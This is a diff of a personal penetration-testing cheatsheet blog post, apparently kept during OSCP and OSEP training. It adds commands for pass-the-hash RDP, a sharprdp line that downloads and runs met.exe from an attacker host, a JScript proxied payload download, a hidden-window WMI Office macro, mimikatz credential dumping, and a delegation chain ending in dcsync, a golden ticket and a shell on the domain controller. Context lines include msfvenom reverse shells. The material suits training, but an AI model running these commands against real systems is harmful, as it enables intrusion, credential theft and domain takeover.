@@ -4,8 +4,8 @@
 <meta http-equiv=x-ua-compatible content="ie=edge">
 <meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
 <meta name=author content="ceso ">
-<meta name=description content="Hacking/OSCP Cheatsheet Well, just finished my 90 days journey of OSCP labs, so now here is my cheatsheet of it (and of hacking itself), I will be adding stuff in an incremental way as I go having time and/or learning new stuff. But this is basically the tools I tend to relie and use in this way the most. Hope is helpfull for you!
-Enumeration Network discoverie Nmap I tend to run 3 nmaps, an initial one, a full one and an UDP one, all of them in parallel:">
+<meta name=description content="Hacking Cheatsheet Well, just finished my 90 days journey of OSCP labs, so now here is my cheatsheet of it (and of hacking itself), I will be adding stuff in an incremental way as I go having time and/or learning new stuff. But this is basically the tools I tend to relie and use in this way the most. Hope is helpfull for you!
+Edit 2021/11: I&amp;rsquo;m going through OSEP challenges and as so, Im updating this with stuff Im using there because I kept forgetting commands often">
 <meta name=keywords content="CTF,Security,HTB,Blog,Infosec,blog,cheatsheet,hacking,linux,windows,exfiltration,privilegeescalation">
 <meta name=robots content="noodp">
 <meta name=theme-color content="#252627">
@@ -27,7 +27,7 @@ Hacking Cheatsheet :: Ceso Adventures
 <meta itemprop=name content="Hacking Cheatsheet">
 <meta itemprop=description content="My humble cheatsheet of most used tools, webs, etc"><meta itemprop=datePublished content="2020-04-07T02:30:30+00:00">
 <meta itemprop=dateModified content="2020-04-07T02:30:30+00:00">
-<meta itemprop=wordCount content="2268"><meta itemprop=image content="https://ceso.github.io/images/cheatsheet/banner.jpg">
+<meta itemprop=wordCount content="3521"><meta itemprop=image content="https://ceso.github.io/images/cheatsheet/banner.jpg">
 <meta itemprop=keywords content="blog,cheatsheet,hacking,linux,windows,exfiltration,privilegeescalation,">
 <meta name=twitter:card content="summary_large_image">
 <meta name=twitter:image content="https://ceso.github.io/images/cheatsheet/banner.jpg">
@@ -62,7 +62,7 @@ Hacking Cheatsheet :: Ceso Adventures
 <div class=content>
 <div class=post>
 <div class=post-info>
-<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>11 minutes
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>17 minutes
 </p>
 </div>
 <h2 class=post-title><a href=https://ceso.github.io/posts/2020/04/hacking-cheatsheet/>Hacking Cheatsheet</a></h2>
@@ -83,10 +83,10 @@ Hacking Cheatsheet :: Ceso Adventures
 <div class=post-content><div id=TableOfContents>
 <ul>
 <li>
-<a href=#hackingoscp-cheatsheet>Hacking/OSCP Cheatsheet</a>
+<a href=#hacking-cheatsheet>Hacking Cheatsheet</a>
 <ul>
 <li>
-<a href=#enumeration>Enumeration</a>
+<a href=#general-enumeration>General enumeration</a>
 <ul>
 <li>
 <a href=#network-discoverie>Network discoverie</a>
@@ -118,6 +118,8 @@ Hacking Cheatsheet :: Ceso Adventures
 <a href=#fuff>fuff</a>
 </li></ul></li><li>
 <a href=#most-usefull-dictionaries-oscphtb>Most usefull dictionaries (OSCP/HTB)</a>
+</li><li>
+<a href=#trusted-folders-windows>Trusted Folders (Windows)</a>
 </li><li>
 <a href=#samba>Samba</a>
 <ul>
@@ -152,7 +154,12 @@ Hacking Cheatsheet :: Ceso Adventures
 <a href=#sockets>Sockets</a>
 </li><li>
 <a href=#rdp>RDP</a>
-</li></ul></li><li>
+<ul>
+<li>
+<a href=#linux-1>Linux</a>
+</li><li>
+<a href=#windows-1>Windows</a>
+</li></ul></li></ul></li><li>
 <a href=#pivoting>Pivoting</a>
 <ul>
 <li>
@@ -189,7 +196,7 @@ Hacking Cheatsheet :: Ceso Adventures
 <a href=#privilege-escalation>Privilege escalation</a>
 <ul>
 <li>
-<a href=#windows-1>Windows</a>
+<a href=#windows-2>Windows</a>
 <ul>
 <li>
 <a href=#run-as>Run-As</a>
@@ -198,7 +205,7 @@ Hacking Cheatsheet :: Ceso Adventures
 </li><li>
 <a href=#sam--system--security>SAM + SYSTEM + Security</a>
 </li></ul></li><li>
-<a href=#linux-1>Linux</a>
+<a href=#linux-2>Linux</a>
 <ul>
 <li>
 <a href=#homeuseropenssl-ep-empty-capabilities>/home/user/openssl =ep (empty capabilities)</a>
@@ -223,6 +230,23 @@ Hacking Cheatsheet :: Ceso Adventures
 <a href=#linux-lfi---intesresting-files-to-look-after>Linux LFI - intesresting files to look after</a>
 </li><li>
 <a href=#windows-lfi---intesresting-files-to-look-after>Windows LFI - intesresting files to look after</a>
+</li><li>
+<a href=#enable-execution-of-powershell-scripts>Enable execution of PowerShell Scripts</a>
+</li><li>
+<a href=#encode-powershell-b64-from-linux>Encode Powershell b64 from Linux</a>
+</li><li>
+<a href=#encodedecode-b64-in-windows-without-powershell>Encode/Decode b64 in Windows WITHOUT Powershell</a>
+</li><li>
+<a href=#check-the-type-of-language-available-with-powershell>Check the Type of Language available with Powershell</a>
+</li><li>
+<a href=#set-proxy-in-code-used-windows>Set Proxy in code used (Windows)</a>
+<ul>
+<li>
+<a href=#powershell>Powershell</a>
+</li><li>
+<a href=#jscript>JScript</a>
+</li></ul></li><li>
+<a href=#hide-foreground-with-wmi-windows-office-macros>Hide Foreground with WMI (Windows, Office Macros)</a>
 </li></ul></li><li>
 <a href=#simple-buffer-overflow-32-bits-no-aslr-and-no-dep>Simple Buffer Overflow (32 bits, NO ASLR and NO DEP)</a>
 <ul>
@@ -245,12 +269,50 @@ Hacking Cheatsheet :: Ceso Adventures
 <a href=#msfvenom>msfvenom</a>
 </li></ul></li><li>
 <a href=#shellcode-poc-calcexe>Shellcode POC: calc.exe</a>
-</li></ul></li></ul></li></ul>
-</div><h1 id=hackingoscp-cheatsheet>Hacking/OSCP Cheatsheet</h1>
+</li></ul></li><li>
+<a href=#active-directory>Active Directory</a>
+<ul>
+<li>
+<a href=#permissions-ace-access-control-enties-sddl-security-descriptor-definition-language---format>Permissions: ACE (Access Control Enties) SDDL (Security Descriptor Definition Language) - Format</a>
+</li><li>
+<a href=#powerview-methods-for-enumeration>PowerView methods for enumeration</a>
+<ul>
+<li>
+<a href=#acls>ACLs</a>
+</li><li>
+<a href=#users>Users</a>
+</li><li>
+<a href=#groups>Groups</a>
+</li><li>
+<a href=#computers>Computers</a>
+</li><li>
+<a href=#trusts>Trusts</a>
+</li><li>
+<a href=#sids>SID&rsquo;s</a>
+</li></ul></li><li>
+<a href=#exploitation>Exploitation</a>
+<ul>
+<li>
+<a href=#list-all-available-credentials-cached-hashes-and-passwords-logged-on-user-and-computer>List all available credentials cached (Hashes and Passwords; Logged on user and computer)</a>
+</li><li>
+<a href=#genericall>GenericAll</a>
+</li><li>
+<a href=#genericwrite>GenericWrite</a>
+</li><li>
+<a href=#writedacl>WriteDACL</a>
+</li><li>
+<a href=#unconstrained-delegation>Unconstrained Delegation</a>
+</li><li>
+<a href=#constrained-delegation>Constrained Delegation</a>
+</li><li>
+<a href=#resource-based-constrained-delegation-rbcd>Resource-Based Constrained Delegation (RBCD)</a>
+</li></ul></li></ul></li></ul></li></ul>
+</div><h1 id=hacking-cheatsheet>Hacking Cheatsheet</h1>
 <p>Well, just finished my 90 days journey of OSCP labs, so now here is my cheatsheet of it (and of hacking itself), I will be adding stuff in an incremental way as I go having time and/or learning new stuff.
 But this is basically the tools I tend to relie and use in this way the most.
 Hope is helpfull for you!</p>
-<h2 id=enumeration>Enumeration</h2>
+<p>Edit 2021/11: I&rsquo;m going through OSEP challenges and as so, Im updating this with stuff Im using there because I kept forgetting commands often</p>
+<h2 id=general-enumeration>General enumeration</h2>
 <h3 id=network-discoverie>Network discoverie</h3>
 <h4 id=nmap>Nmap</h4>
 <p>I tend to run 3 nmaps, an initial one, a full one and an UDP one, all of them in parallel:</p>
@@ -317,6 +379,14 @@ In seclists-pkg:
 /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
 /usr/share/seclists/Passwords/Leaked-Databases/alleged-gmail-passwords.txt
 /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+</code></pre><h3 id=trusted-folders-windows>Trusted Folders (Windows)</h3>
+<pre tabindex=0><code class=language-console data-lang=console>accesschk.exe &quot;ceso&quot; C:\ -wus
+  -&gt; -w is to locate writable directories
+  -&gt; -u supress errors
+  -&gt; -s makes recursion on all subdirectories
+
+icacls.exe C:\Windows\Tasks
+  ^-- Verify if Tasks has execution permissions for example (flag is &quot;RX&quot;)
 </code></pre><h3 id=samba>Samba</h3>
 <h4 id=smbclient>smbclient</h4>
 <p>Check if there is anonymous login enabled:</p>
@@ -395,7 +465,28 @@ Victim:
   nc -v 192.168.42.42 443 &gt; evil.php
 </code></pre><h3 id=rdp>RDP</h3>
 <p>If we have access to a windows machine with a valid user/credentials and this user is in the &ldquo;Remote Desktop Users&rdquo;, we can share a local directorie as a mount volume through rdp itself once we connect to the machine:</p>
+<h4 id=linux-1>Linux</h4>
+<h5 id=mounting-volume>Mounting volume</h5>
 <pre tabindex=0><code class=language-console data-lang=console>rdesktop -g 1600x800 -r disk:tmp=/usr/share/windows-binaries 192.168.30.30 -u pelota -p -
+</code></pre><h5 id=forcing-enable-of-clipboard>Forcing enable of clipboard</h5>
+<p>I might want to force the use of the clipboard if it&rsquo;s not being taken by default and use the 100% of the screen:</p>
+<pre tabindex=0><code class=language-console data-lang=console>rdesktop 192.168.42.42 -d arkham -u ceso -p pirata -g 100% -x 0x80 -5 -K -r clipboard:CLIPBOARD
+</code></pre><h5 id=connection-with-restricted-admin-mode>Connection with restricted admin mode</h5>
+<pre tabindex=0><code class=language-console data-lang=console>xfreerdp en Linux soporta restricted admin mode, se ejecuta asi por ej: `xfreerdp /u:admin /pth:&lt;NTLM-hash-of-user-admin-pass&gt; /v:192.168.42.42 /cert-ignore
+</code></pre><h4 id=windows-1>Windows</h4>
+<h5 id=restricted-admin-mode>Restricted admin mode</h5>
+<pre tabindex=0><code class=language-console data-lang=console>Enable it :
+  Through registry: 
+    HKLM:\System\CurrentControlSet\Control\Lsa
+    Use &quot;DisableRestrictedAdmin&quot; property
+  With Powershell:
+    New-ItemProperty -Path &quot;HKLM:\System\CurrentControlSet\Control\Lsa&quot; -Name DisableRestrictedAdmin -Value 0  
+
+Connect it:
+  --&gt; mstsc.exe /restrictedadmin
+</code></pre><h5 id=stacked-commands-without-gui>Stacked commands without GUI</h5>
+<pre tabindex=0><code class=language-console data-lang=console>sharprdp.exe computername=appsrv01 command=&quot;powershell (New-Object System.Net.WebClient).DownloadFil
+e('http://192.168.42.42/met.exe', 'C:\Windows\Tasks\met.exe'); C:\Windows\Tasks\met.exe&quot; username=example\ceso password=soyUnaPassword
 </code></pre><h2 id=pivoting>Pivoting</h2>
 <p>It&rsquo;s possible to do pivoting by using proxychains, pure nc&rsquo;s or in case of linux just some fifo files (I will write them down this another methods down maybe in a future), I have used during all the OSCP an awesome tool called (sshuttle)[https://github.com/sshuttle/sshuttle] (it&rsquo;s a transparent proxy server that works like &ldquo;a vpn&rdquo;, and doesn&rsquo;t require with super rights, only thing needed is that the bastion server you will use, needs to have installed python) and sometimes some SSH Forwarding. Something worth to mention nmap doesn&rsquo;t work through sshuttle.</p>
 <h3 id=sshuttle>sshuttle</h3>
@@ -443,7 +534,7 @@ ssh foo@192.168.25.74
 </code></pre><h3 id=linux-staged-reverse-tcp-1>Linux staged reverse TCP</h3>
 <pre tabindex=0><code class=language-console data-lang=console>msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.42.42 LPORT=443 -f elf -o &lt;outout_name&gt;.elf
 </code></pre><h2 id=privilege-escalation>Privilege escalation</h2>
-<h3 id=windows-1>Windows</h3>
+<h3 id=windows-2>Windows</h3>
 <h4 id=run-as>Run-As</h4>
 <pre tabindex=0><code class=language-console data-lang=console>PS C:\&gt; $secstr = New-Object -TypeName System.Security.SecureString
 PS C:\&gt; $username = &quot;&lt;domain&gt;\&lt;user&gt;&quot;
@@ -462,7 +553,7 @@ Invoke-Command -ComputerName localhost -Creadential $credential -ScriptBlock { C
 <pre tabindex=0><code class=language-console data-lang=console>/usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM.bak -security SECURITY.bak -system SYSTEM.bak LOCAL
 
 sudo john dumped_hashes --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
-</code></pre><h3 id=linux-1>Linux</h3>
+</code></pre><h3 id=linux-2>Linux</h3>
 <h4 id=homeuseropenssl-ep-empty-capabilities>/home/user/openssl =ep (empty capabilities)</h4>
 <p>Make 2 copies of passwd, one as backup of the original, and one that will be used as custom:</p>
 <pre tabindex=0><code class=language-console data-lang=console>cp /etc/passwd /tmp/passwd.orig
@@ -591,6 +682,47 @@ C:/Program Files/MySQL/MySQL Server 5.1/my.ini
 C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml 
 C:/Windows/System32/inetsrv/config/applicationHost.config 
 C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
+</code></pre><h3 id=enable-execution-of-powershell-scripts>Enable execution of PowerShell Scripts</h3>
+<pre tabindex=0><code class=language-console data-lang=console>Set-ExecutionPolicy RemoteSigned
+Set-ExecutionPolicy Unrestricted
+powershell.exe -exec bypass
+</code></pre><h3 id=encode-powershell-b64-from-linux>Encode Powershell b64 from Linux</h3>
+<pre tabindex=0><code class=language-console data-lang=console>echo 'ImAnEviCradleBuuhhhh' | iconv --to-code UTF-16LE | base64 -w0
+</code></pre><h3 id=encodedecode-b64-in-windows-without-powershell>Encode/Decode b64 in Windows WITHOUT Powershell</h3>
+<pre tabindex=0><code class=language-console data-lang=console>certutil -encode &lt;inputfile&gt; &lt;outputfile&gt;
+certutil -decode &lt;b64inputfile&gt; &lt;plainoutputdecodedfile&gt;
+  ^-- If the file exists I can use the -f flag which will force an overwrite
+</code></pre><h3 id=check-the-type-of-language-available-with-powershell>Check the Type of Language available with Powershell</h3>
+<pre tabindex=0><code class=language-console data-lang=console>$ExecutionContext.SessionState.LanguageMode
+
+Possible types are:
+  - Full Language
+  - RestrictedLanguage
+  - No Language
+  - Constrained Language
+</code></pre><h3 id=set-proxy-in-code-used-windows>Set Proxy in code used (Windows)</h3>
+<h4 id=powershell>Powershell</h4>
+<pre tabindex=0><code class=language-console data-lang=console>[System.Net.WebRequest]::DefaultWebProxy.GetProxy(url)
+</code></pre><h4 id=jscript>JScript</h4>
+<pre tabindex=0><code class=language-console data-lang=console>var url = &quot;http://192.168.42.43/reverse.exe&quot;;
+var var Object = new ActiveXObject(&quot;MSXML2.ServerXMLHTTP.6.0&quot;);
+Object.setProxy(&quot;2&quot;,&quot;192.168.42.42:3128&quot;);
+Object.open('GET', url, false);
+Object.send();
+  ^-- This was tricky because lack of debug information. The parameter in &quot;2&quot; means &quot;SXH_PROXY_SET_PROXY&quot;, and it allows to specify a list of one or more servers together with a bypass list. The .open() must be in lowercase otherwise .Open() is another method
+</code></pre><h3 id=hide-foreground-with-wmi-windows-office-macros>Hide Foreground with WMI (Windows, Office Macros)</h3>
+<pre tabindex=0><code class=language-console data-lang=console>Sub example()
+  Const HIDDEN_WINDOW = 0
+  Dim cmd As String
+
+  cmd = &quot;Here there is some commands to execute inside the macro via WMI&quot;
+  Set objWMIService = GetObject(&quot;winmgmts:&quot;)
+  Set objStartup = objWMIService.Get(&quot;Win32_ProcessStartup&quot;)
+  Set objConfig = objStartup.SpawnInstance_
+  objConfig.ShowWindow = HIDDEN_WINDOW
+  Set objProcess = GetObject(&quot;winmgmts:Win32_Process&quot;)
+  errReturn = objProcess.Create(str, Null, objConfig, pid)
+End Sub
 </code></pre><h2 id=simple-buffer-overflow-32-bits-no-aslr-and-no-dep>Simple Buffer Overflow (32 bits, NO ASLR and NO DEP)</h2>
 <h3 id=summarized-steps>Summarized steps</h3>
 <ul>
@@ -633,7 +765,81 @@ EOF
 /usr/bin/msfvenom
 </code></pre><h3 id=shellcode-poc-calcexe>Shellcode POC: calc.exe</h3>
 <pre tabindex=0><code class=language-console data-lang=console>msfvenom -p windows/exec -b '\x00\x0A' -f python --var-name buffer CMD=calc.exe EXITFUNC=thread
-</code></pre>
+</code></pre><h2 id=active-directory>Active Directory</h2>
+<h3 id=permissions-ace-access-control-enties-sddl-security-descriptor-definition-language---format>Permissions: ACE (Access Control Enties) SDDL (Security Descriptor Definition Language) - Format</h3>
+<pre tabindex=0><code class=language-console data-lang=console>ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid
+
+--&gt; ace_type: defines allow/deny/audit
+--&gt; ace_flags: inheritance objects
+--&gt; rights: incremental list with given permissions (allowed/audited/denied), incrmentalas ARE NOT the only ones
+--&gt; object_guid and inherit_object: Allows to apply an ACE on a specified objects by GUID values. GUID is an object class, attribute, set or extended right, if pressent limits the ACE's to the object the GUID represents. Inherited GUID represents an object class, if present will limit the inheritance of ACE's to the child enties only of that object
+--&gt; account_sid: SID of the object the ACE is applying, is the SID of the user or group to the one permissions are being assigned, sometimes there are acronyms of well known SID's instead of numerical ones
+</code></pre><h3 id=powerview-methods-for-enumeration>PowerView methods for enumeration</h3>
+<h4 id=acls>ACLs</h4>
+<pre tabindex=0><code class=language-console data-lang=console>Get-ObjectAcl -Identity ceso &lt;-- Get all the objects and acls the given user has
+</code></pre><h4 id=users>Users</h4>
+<pre tabindex=0><code class=language-console data-lang=console>Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | ForEach-Object {$_ | Add-Member -NoteProperty    Name Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | ForEach-Object {if (    $_.Identity -eq $(&quot;$env:UserDomain\$env:Username&quot;)) {$_}} &lt;-- Maps all users in the domain into a table replacing the SID for the name
+
+Get-DomainUser -Domain example.com &lt;-- Enumeration truncated only to the users in the given domain
+
+Get-DomainUser -TrustedToAut &lt;-- List all the SPN's which have Constrained Delegation
+</code></pre><h4 id=groups>Groups</h4>
+<pre tabindex=0><code class=language-console data-lang=console>Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | ForEach-Object {$_ | Add-Member -NoteP    ropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | ForEach-Objec    t {if ($_.Identity -eq $(&quot;$env:UserDomain\$env:Username&quot;)) {$_}} &lt;-- Maps all groups in the domain into a table replacing the SID for the name
+
+Get-DomainGroup -Domain example.com &lt;-- Enumeration truncated only to the users in the given domain
+
+Get-DomainGroupMember &quot;Enterprise Admins&quot; -Domain example.com &lt;-- Get ALL the members of the group &quot;Enterprise Admins&quot; inside the example.com domain
+
+Get-DomainForeignGroupMember -Domain example2.com &lt;-- Enumerate groups in a trusted forest or domain which contains NON-NATIVE members
+</code></pre><h4 id=computers>Computers</h4>
+<pre tabindex=0><code class=language-console data-lang=console>Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identit    y -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity     -eq $(&quot;$env:UserDomain\$env:Username&quot;)) {$_}} &lt;-- Enumerate computers accounts in the domain
+
+Get-DomainComputer -Unconstrained &lt;-- Enumerate unconstrained computers
+
+Get-DomainComputer -Identity cesoComputer &lt;-- Verify that cesoComputer exists
+</code></pre><h4 id=trusts>Trusts</h4>
+<pre tabindex=0><code class=language-console data-lang=console>Get-DomainTrust &lt;-- Enumerate trusts by making an LDAP query, this works by the DC creating a Trusted Domain Object (TDO)
+
+Get-DomainTrust -API &lt;-- Enumerate trusts by using Win32 API DsEnumerateDomainTrusts
+    ^-- If I add the -domain flag, it will enumerate all the found in the domain
+
+Get-DomainTrustMapping &lt;-- Automate the process of enumeration for all forest trust and their child domains trust
+</code></pre><h4 id=sids>SID&rsquo;s</h4>
+<pre tabindex=0><code class=language-console data-lang=console>Get-DomainSID &lt;-- Get the SID of the current domain
+Get-DomainSID -Domain example.com &lt;-- Get the SID of example.com
+</code></pre><h3 id=exploitation>Exploitation</h3>
+<h4 id=list-all-available-credentials-cached-hashes-and-passwords-logged-on-user-and-computer>List all available credentials cached (Hashes and Passwords; Logged on user and computer)</h4>
+<pre tabindex=0><code class=language-console data-lang=console>mimikatz.exe &quot;sekurlsa::logonpasswords&quot; exit
+</code></pre><h4 id=genericall>GenericAll</h4>
+<h4 id=genericwrite>GenericWrite</h4>
+<h4 id=writedacl>WriteDACL</h4>
+<h4 id=unconstrained-delegation>Unconstrained Delegation</h4>
+<h5 id=by-forwardable-tgt-after-login>By Forwardable TGT after login</h5>
+<pre tabindex=0><code class=language-console data-lang=console>1 - Enumerate if there if there is unconstrained delegation
+2 - If there is, open mimikatz (commands blow are inside it)
+3 - privilege::debug &lt;-- Enable debug
+4 - sekurlsa::tickets &lt;-- List all the present tickets 
+5 - Through phishing or visit of a page, if the user has Windows Auth then it will use kerberos
+6 - sekurlsa::tickets &lt;-- Verify if there are new TGT's
+7 - sekurlsa::tickets /export &lt;-- If new TGT and marked as forwardable export them to disk
+8 - kerberos::ptt /inject:&lt;some-exported-tkt-file.kirbi&gt; &lt;-- Inject the exported ticket into memory
+9 - C:\Windows\Temp\PsExec.exe \\example.com cmd &lt;-- Try to get a cmd shell in example.com by leveraging injected ticket
+
+* By default every user allows their TGT to be delegated, but high privilege users can be added to the group &quot;Protected Users Group&quot; to disable it, it also can break the application for which at the beggining unconstrained delegation was enabled for those users
+</code></pre><h5 id=by-using-of-spoolsampleexe>By using of SpoolSample.exe</h5>
+<pre tabindex=0><code class=language-console data-lang=console>1 - Download and compile SpoolSample in a dev machine, it can be downloaded from: https://github.com/leechristensen/SpoolSample
+2 - Download and compile Rubeus in a dev machine, it can be downloaded from: https://github.com/GhostPack/Rubeus
+3 - Find a way to upload SpoolSample and Rubeus without being detected (for example, disabling Windows Defender, or injecting them into memory through reflection for example), for ease of the technique, all below is just written to disk
+4 - Rubeus.exe monitor /interval:5 /filteruser:DC01$ &lt;-- Monitor for TGTs originated in the DC01 machine. THIS MUST BE RUN FROM A DIFFERENT SHELL THAN THE ONE USED FOR THE NEXT STEP
+5 - SpoolSample.exe DC01 VICTIM01 &lt;-- Leverage &quot;RpcOpenPrinter&quot; and &quot;RpcRemoteFindFirstPrinterChangeNotification&quot; to get a notif
+6 - Rubeus.exe ptt /ticket:&lt;b64-from-rubeus-monitor&gt; &lt;-- Inject into memory the b64 ticket obtained by monitoring for tickets from DC01 to VICTIM01
+7 - lsadump::dcsync /domain:example.com /user:example\krbtgt &lt;-- Dump the NTLM hash of the krbtgt user by leveraging the just injected ticket (It could also be possible to dump the hash of the pass of a member from the &quot;Domain Admins&quot; group). THIS IS RUN FROM INSIDE MIMIKATZ
+8 - kerberos::golden /user:krbtgt /domain:example.com /sid:&lt;sid-showed-in-dcsync or obtained by PowerView&gt; /rc4:&lt;ntlm-hash-dumped-with-dcsync&gt; /ptt &lt;-- Craft a golden ticket and inject it into memory
+9 - dir \\dc01\\c$ &lt;-- Verify read access on dc01
+10 - misc::cmd &lt;-- Open cmd prompt from inside Mimikatz
+11 - C:\Windows\Temp\PsExec.exe -accepteula \\dc01 cmd &lt;-- Get a shell on dc01 by leveraging the golden ticket injected
+</code></pre><h4 id=constrained-delegation>Constrained Delegation</h4>
+<h4 id=resource-based-constrained-delegation-rbcd>Resource-Based Constrained Delegation (RBCD)</h4>
 </div>
 <div class=pagination>
 <div class=pagination__title>
